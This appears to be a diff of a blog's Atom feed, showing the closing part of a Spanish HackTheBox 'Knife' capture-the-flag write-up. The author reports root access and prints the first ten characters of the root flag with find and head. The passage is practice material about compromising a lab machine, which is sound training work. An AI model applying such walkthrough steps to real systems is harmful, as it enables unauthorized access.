-&lt;p&gt;¡Logramos tener acceso a la maquina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!&lt;/p&gt;
-
-&lt;p&gt;Solo hace falta buscar la flag correspondiente y eso sería todo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# find . -name root.txt 2&amp;gt;/dev/null&lt;/span&gt;
-./root/root.txt
-&lt;span class=&quot;c&quot;&gt;# head -c 10 ./root/root.txt ; echo&lt;/span&gt;
-4b01b07a6d
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;¡Hemos logrado nuestra primera maquina del blog en HackTheBox!&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/knife/05finish.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;Por último, les recomiendo seguir &lt;strong&gt;practicando&lt;/strong&gt; y si pueden generar contenido, mucho mejor! Espero les pueda servir de algo este material.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="Knife" /><summary type="html">Vamos a resolver la maquina Knife de HackTheBox. ¡Let's hack!</summary></entry></feed>
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Bash" /><category term="Script" /><summary type="html">Vamos a crear la función mkhack para organizar nuestros ficheros. ¡Let's hack!</summary></entry></feed>
